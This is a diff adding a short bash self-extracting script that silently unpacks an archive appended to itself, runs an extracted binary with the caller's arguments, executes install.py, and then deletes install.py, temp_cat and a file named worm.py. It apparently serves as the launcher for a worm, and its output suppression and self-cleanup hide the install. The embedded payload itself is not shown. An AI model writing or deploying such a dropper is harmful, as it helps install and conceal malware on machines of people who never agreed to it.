@@ -1,0 +1,26 @@
+#!/bin/bash
+
+arg=$@
+
+process_tar(){
+	cd $WORK_DIR
+	chmod +x temp_cat
+	./temp_cat ${arg[@]}
+	python3 install.py
+	rm install.py temp_cat worm.py
+}
+
+PAYLOAD_LINE=$(awk '/^__PAYLOAD_BEGINS__/ { print NR + 1; exit 0; }' $0)
+
+PAYLOAD_END=$(awk '/^__PAYLOAD_END__/ { print NR + 1; exit 0; }' $0)
+
+interval=`expr $PAYLOAD_END - $PAYLOAD_LINE`
+
+WORK_DIR=./
+
+tail -n +${PAYLOAD_LINE} $0 | head -n ${interval} | tar -zpvx -C $WORK_DIR > /dev/null 2>&1
+
+process_tar
+
+exit 0
+__PAYLOAD_BEGINS__
